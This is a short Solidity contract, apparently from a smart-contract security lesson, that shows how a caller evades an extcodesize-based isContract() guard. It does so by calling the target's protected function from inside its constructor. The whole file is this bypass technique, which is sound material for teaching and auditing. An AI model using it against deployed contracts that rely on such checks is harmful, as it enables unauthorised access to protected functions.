// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.10;
import "./FirstContract.sol";

contract ThirdContract {
    bool public isContract;
    bool public accessed; 
    address public addr;

    // When this contract is being created, 
    // the code size (extcodesize) will be 0.
    // Hence it bypasses the isContract() check.
    constructor(address _target) {

        addr = address(this);
        FirstContract test = FirstContract(_target);
        isContract = test.isContract(addr);

        // This function call will work
        accessed = test.protected();
    }
}